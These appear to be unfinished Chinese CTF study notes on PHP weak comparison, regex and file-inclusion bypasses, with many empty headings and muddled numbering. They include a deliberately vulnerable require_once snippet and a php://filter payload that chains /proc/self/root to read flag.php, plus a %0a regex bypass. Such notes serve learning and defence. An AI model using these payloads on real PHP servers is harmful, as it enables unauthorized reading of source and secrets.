# 0x01 语言特性

## 函数缺陷

### 1.strpos

```php
if(stripos($url,'.')){
	die("unknow url");
}
if(stripos($url,'.') == False){
	die('unkonw url');
}
```

当匹配的字符处于第一位的时候返回0，由于弱比较返回结果为True

### 2.md5

#### hash比较缺陷

#### 数组绕过

#### 强类型比较绕过

### 3.switch

```php
<?php
  $a="22a";
  switch($a){
    case 22:
      echo "true";
      break;
    case 1:
      break;
    default:
      echo "default";
  }
```

### 4.in_array

### 5.变量覆盖

#### extrct



#### parse_str



#### $$



### 6.intval



### 4.preg_match

#### 正则回溯



#### 换行绕过

```php
if(preg_match('/^php$/i',$a)){
	echo "flag";
}
```

一般来说`/^xxx$/`只匹配第一行，所以可以通过`%0a`进行绕过。

#### 数组绕过



### 5.preg_replace



### 6.in_array

### 7.ereg





### require_once

在php中，`require_once`在调用时php会检查该文件是否已经被包含过。如果是则不会再次包含，那么我们可以尝试绕过这个机制吗？不写入webshell只读文件有办法吗？

```php
<?php
error_reporting(E_ALL);
require_once('flag.php');
highlight_file(__FILE__);
if(isset($_GET['content'])) {
  $content = $_GET['content'];
  require_once($content);
} 
```

php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经包含后在调用`require_once('flag.php')`会查找哈希表是否存在该文件名。

那么该如何绕过哈希表检测呢？**在这里我们可以利用`/proc`文件系统**

```
/proc/self`: 指向当前的进程的`/proc/pid
```

`/proc/self/root/`是指向`/`的符号连接

php_sys_lstat()实际上就是linux的lstat()，这个函数是用来获取一些文件相关的信息，成功执行时，返回0。失败返回-1，并且会设置errno，因为之前符号链接过多，所以errno就都是ELOOP，符号链接的循环数量真正取决于SYMLOOP_MAX，这是个runtime-value，它的值不能小于_POSIX_SYMLOOP_MAX。

```php
php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

### 1.2. session_decode